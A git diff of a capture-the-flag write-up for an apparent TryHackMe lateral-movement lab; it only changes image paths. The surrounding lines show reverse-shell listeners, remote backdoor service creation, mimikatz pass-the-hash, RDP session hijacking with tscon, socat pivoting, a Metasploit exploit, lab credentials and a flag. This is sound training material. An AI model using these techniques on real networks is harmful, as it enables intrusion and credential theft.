@@ -94,7 +94,7 @@ This will be helpful whenever needing to do a reverse connection back to your at
 
 Once we do all that, we can get our credentials, in this case, i got:
 
-![](../images/Pasted%20image%2020250516124417.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250516124417.png)
 
 ```
 iain.phillips:Wavk4711
@@ -120,7 +120,7 @@ getent hosts thmjmp2.za.tryhackme.com
 Now we can access ssh:
 
 
-![](../images/Pasted%20image%2020250516125158.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250516125158.png)
 
 
 
@@ -425,7 +425,7 @@ nc -lvnp 4443
 
 Once we follow all steps, we receive our second shell:
 
-![](../images/Pasted%20image%2020250516132529.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250516132529.png)
 
 Now, we need to follow the last steps:
 
@@ -444,7 +444,7 @@ sc.exe \\thmiis.za.tryhackme.com start BDOORSERVICE-3249
 
 If we followed all steps correctly, we can check this in our `metasploit` listener:
 
-![](../images/Pasted%20image%2020250516132701.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250516132701.png)
 
 As seen, we got a shell as `nt authority\system`, let's get our flag:
 
@@ -707,7 +707,7 @@ Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Insta
 
 If we follow these steps and check our `msfconsole` listener, we notice this:
 
-![](../images/Pasted%20image%2020250516134323.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250516134323.png)
 
 We got our shell, let's read our flag:
 
@@ -1026,7 +1026,7 @@ Expand-Archive .\mimikatz.zip
 
 Once we do all that, we can see the `mimikatz.exe` file inside of `mimikatz/x64`:
 
-![](../images/Pasted%20image%2020250516143313.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250516143313.png)
 
 We can now proceed, let's perform pass the hash, in order to do it, let's follow these steps:
 
@@ -1069,7 +1069,7 @@ mimikatz # sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:533f1
 
 If we had our listener ready, we can see the connection:
 
-![](../images/Pasted%20image%2020250516144946.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250516144946.png)
 
 Now, we need to do:
 
@@ -1079,7 +1079,7 @@ winrs.exe -r:thmiis.za.tryhackme.com cmd.exe
 
 If we check the hostname:
 
-![](../images/Pasted%20image%2020250516145407.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250516145407.png)
 
 Nice, let's get our flag:
 
@@ -1188,7 +1188,7 @@ Follow the instructions to hijack t1_toby.beck's RDP session on THMJMP2 to get
 
 Let's get our credentials:
 
-![](../images/Pasted%20image%2020250516145932.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250516145932.png)
 
 I got:
 
@@ -1202,7 +1202,7 @@ Let's go into rdp:
 xfreerdp /v:thmjmp2.za.tryhackme.com /u:t2_kelly.blake /p:8LXuPeNHZFFG -clipboard
 ```
 
-![](../images/Pasted%20image%2020250516150128.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250516150128.png)
 
 Let's open a `cmd` and do:
 
@@ -1212,7 +1212,7 @@ C:\tools\psexec64.exe -accepteula -s -i cmd.exe
 
 We now get a shell as `nt authority\system`:
 
-![](../images/Pasted%20image%2020250516150429.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250516150429.png)
 
 Let's do:
 
@@ -1220,7 +1220,7 @@ Let's do:
 query session
 ```
 
-![](../images/Pasted%20image%2020250516150509.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250516150509.png)
 
 We can notice the sessions, let's use:
 
@@ -1228,7 +1228,7 @@ We can notice the sessions, let's use:
 query user
 ```
 
-![](../images/Pasted%20image%2020250516150619.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250516150619.png)
 
 Now, we can steal any session, let's steal the last one:
 
@@ -1238,7 +1238,7 @@ tscon 7 /dest:rdp-tcp#14
 
 Once we do the command, we can see this:
 
-![](../images/Pasted%20image%2020250516150728.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250516150728.png)
 
 As seen, we were able to steal the session and get the flag:
 
@@ -1525,12 +1525,12 @@ PS C:\tools\socat>.\socat.exe TCP4-LISTEN:13337,fork TCP4:THMIIS.za.tryhackme.co
  xfreerdp /v:THMJMP2.za.tryhackme.com:13337 /u:t1_thomas.moore /p:MyPazzw3rd2020
 ```
 
-![](../images/Pasted%20image%2020250516153630.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250516153630.png)
 
 
 We can now get our flag:
 
-![](../images/Pasted%20image%2020250516153642.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250516153642.png)
 
 ```
 THM{SIGHT_BEYOND_SIGHT}
@@ -1588,7 +1588,7 @@ msf6 exploit(windows/http/rejetto_hfs_exec) > exploit
 
 Once we run exploit, we can see our shell:
 
-![](../images/Pasted%20image%2020250516155044.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250516155044.png)
 
 Let's get our flag:
 
